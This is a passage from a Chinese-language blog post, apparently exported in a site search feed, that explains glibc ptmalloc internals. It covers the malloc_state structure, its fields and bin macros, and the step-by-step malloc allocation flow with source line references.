<li>该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。由于 thread 的 arena 可能有多个，malloc state 结构会在最新申请的 arena 中。</li>
<li>main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so数据段</li>
</ul>
<blockquote>
<ul>
<li><p>__libc_lock_define(, mutex);</p>
<p>该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成候才能够使用。</p>
</li>
<li><p>flags</p>
<p>flags 记录了分配区的一些标志，比如 bit0 记录了分配区是否有 fast bin chunk ，bit1 标识分配区是否能返回连续的虚拟地址空间。具体如下</p>
</li>
<li><p>fastbinsY[NFASTBINS]<br>存放每个 fast chunk 链表头部的指针</p>
</li>
<li><p>top<br>指向分配区的 top chunk</p>
</li>
<li><p>last_reminder<br>最新的 chunk 分割之后剩下的那部分</p>
</li>
<li><p>bins<br>用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</p>
</li>
<li><p>binmap<br>ptmalloc 用一个 bit 来标识某一个 bin 中是否包含空闲 chunk 。</p>
</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><span class="line">#define NBINS             128</span><br><span class="line">#define NSMALLBINS         64</span><br></pre></td></tr></table></figure>

<h1 id="流程概述"><a href="#流程概述" class="headerlink" title="流程概述"></a>流程概述</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ptmalloc 的响应用户内存分配要求的具体步骤为:</span><br><span class="line"></span><br><span class="line">1) 获取分配区的锁, 为了防止多个线程同时访问同一个分配区, 在进行分配之前需要取得分配区域的锁. 线程先查看线程私有实例中是否已经存在一个分配区, 如果存 在尝试对该分配区加锁, 如果加锁成功, 使用该分配区分配内存, 否则, 该线程搜 索分配区循环链表试图获得一个空闲（没有加锁）的分配区. 如果所有的分配区都 已经加锁, 那么 ptmalloc 会开辟一个新的分配区, 把该分配区加入到全局分配区循 环链表和线程的私有实例中并加锁, 然后使用该分配区进行分配操作. 开辟出来的 新分配区一定为非主分配区, 因为主分配区是从父进程那里继承来的. 开辟非主分配区时会调用 mmap()创建一个 sub-heap, 并设置好 top chunk.</span><br><span class="line"></span><br><span class="line">2) 将用户的请求大小转换为实际需要分配的 chunk 空间大小. 具体查看 request2size 宏 (malloc.c:3332)</span><br><span class="line"></span><br><span class="line">3) 判断所需分配 chunk 的大小是否满足 chunk_size &lt;= max_fast (max_fast 默认为 64B),  如果是的话, 则转下一步, 否则跳到第 5 步. (malloc.c:3340)</span><br><span class="line"></span><br><span class="line">4) 首先尝试在 Fastbins 中查找所需大小的 chunk 分配给用户. 如果可以找到, 则分配结束. 否则转到下一步. (malloc.c:3340)</span><br><span class="line"></span><br><span class="line">5) 判断所需大小是否处在 small bins 中, 即判断 chunk_size &lt; 512B 是否成立. 如果 chunk 大小处在 small bins 中, 则转下一步, 否则转到第 7 步. (malloc.c:3377)</span><br><span class="line"></span><br><span class="line">6) 根据所需分配的 chunk 的大小, 找到具体所在的某个 small bin, 从该 Bin 的尾部摘取一个恰好满足大小的 chunk. 若成功, 则分配结束, 否则, 转到 8. (malloc.c:3377)</span><br><span class="line"></span><br><span class="line">7) 到了这一步, 说明需要分配的是一块大的内存, 于是, ptmalloc 首先会遍历 Fastbins 中的 chunk, 将相邻的空闲 chunk 进行合并,  并链接到 unsorted bin 中. 对于 Fastbins 的合并是由 `malloc_consolidate` 做处理. (malloc.c:3421)</span><br><span class="line"></span><br><span class="line">8) 遍历 unsorted bin 中的 chunk, 如果请求的 chunk 是一个 small chunk, 且 unsorted bin 只有一个 chunk, 并且这个 chunk 在上次分配时被使用过(也就是 last_remainder), 并且 chunk 的大小大于 (分配的大小 + MINSIZE), 这种情况下就直接将该 chunk 进行切割, 分配结束, 否则继续遍历, 如果发现一个 unsorted bin 的 size 恰好等于需要分配的 size, 命中缓存, 分配结束, 否则将根据 chunk 的空间大小将其放入对应的 small bins 或是 large bins 中, 遍历完成后, 转入下一步. (malloc.c:3442)</span><br><span class="line"></span><br><span class="line">9) 到了这一步说明需要分配的是一块大的内存, 并且 Fastbins 和 unsorted bin 中所有的 chunk 都清除干净 了. 从 large bins 中按照 “smallest-first, best-fit”(最小&amp;合适, 也就是说大于或等于所需 size 的最小 chunk) 原则, 找一个合适的 chunk, 从中划分一块合适大小的 chunk 进行切割, 并将剩下的部分放到 unsorted bin, 若操作成功, 则分配结束, 否则转到下一步. (malloc.c:3576)</span><br><span class="line"></span><br><span class="line">10) 到了这一步说明在对应的 bin 上没有找到合适的大小, 无论是 small bin 还是 large bin, 对于 small bin, 如果没有对应大小的 small bin, 只能 idx+1. 对于 large bin,在上一步的 large bin 并不一定能找到合适的 chunk 进行切割, 因为 large bins 间隔是很大的, 假如当前的 idx 的 large bin 只有一个 chunk, 但是所需 size 大于该 chunk, 这就导致找不到合适的, 只能继续 idx+1, 最后都需要根据 bitmap 找到之后第一个非空闲的 bin.  在这两种情况下找到的 bin 中的 chunk 一定可以进行切割或者全部分配(剩余的 size &lt; MINSIZE) (malloc.c:3649)</span><br><span class="line"></span><br><span class="line">11) 如果仍然都没有找到合适的 chunk, 那么就需要操作 top chunk 来进行分配了. 判断 top chunk 大小是否满足所需 chunk 的大小, 如果是, 则从 top chunk 中分出一块来. 否则转到下一步. (malloc.c:3749)</span><br><span class="line"></span><br><span class="line">12) 到了这一步, 说明 top chunk 也不能满足分配要求, 所以, 于是就有了两个选择: 如果是主分配区, 调用 sbrk(), 增加 top chunk 大小；如果是非主分配区, 调用 mmap 来分配一个新的 sub-heap, 增加 top chunk 大小；或者使用 mmap()来直接分配. 在这里, 需要依靠 chunk 的大小来决定到底使用哪种方法. 判断所需分配的 chunk 大小是否大于等于 mmap 分配阈值, 如果是的话, 则转下一步, 调用 mmap 分配,  否则跳到第 13 步, 增加 top chunk 的大小. (malloc.c:3800)</span><br><span class="line"></span><br><span class="line">13) 使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间. 然后将内存指针返回给用户.</span><br><span class="line"></span><br><span class="line">14) 判断是否为第一次调用 malloc, 若是主分配区, 则需要进行一次初始化工作, 分配一块大小为(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap. 若已经初始化过了, 主分配区则调用 sbrk()增加 heap 空间, 分主分配区则在 top chunk 中切割出一个 chunk, 使之满足分配需求, 并将内存指针返回给用户.</span><br></pre></td></tr></table></figure>

<h1 id="图示意"><a href="#图示意" class="headerlink" title="图示意"></a>图示意</h1><p><img alt="malloc流程.png" data-src="https://i.loli.net/2020/04/19/MdVlUyvFLgp4DuT.png" class="lazyload"></p>
]]></content>
      <categories>
        <category>堆</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>malloc</tag>
      </tags>
  </entry>
</search>
